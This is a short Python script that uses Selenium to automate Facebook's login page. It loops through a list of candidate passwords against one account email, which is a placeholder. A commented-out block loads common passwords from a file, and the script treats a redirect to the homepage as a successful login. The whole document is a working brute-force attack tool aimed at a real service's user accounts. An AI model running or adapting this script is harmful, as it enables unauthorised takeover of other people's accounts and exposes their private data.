"""
This code is written by
AMAN KAZI
"""

from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.by import By
import time

browser = webdriver.Chrome('chromedriver.exe')
browser.get("https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=110")

#Use password.txt file which includes some common passwords.
# with open("password.txt") as passfile:
# 	passlist=passfile.readlines()
# 	for x in range(len(passlist)):
# 		if("\n" in passlist[x]):
# 			passlist[x]=passlist[x].strip("\n")
# 		else:
# 			pass

passlist=['1234','allpasswordsgoes here']
try:
	for y in passlist:
		username = browser.find_element_by_id("email")
		username.clear()
		password = browser.find_element_by_id("pass")
		password.clear()
		login   = browser.find_element_by_id("loginbutton")
		username.send_keys("facebook id email here")
		password.send_keys(y)
		login.click()
		time.sleep(10)
		if(browser.current_url == "https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=110"):
			continue
		elif(browser.current_url=="https://www.facebook.com/"):
			print('You are logged in')
			break
except:
	print('Something went wrong')
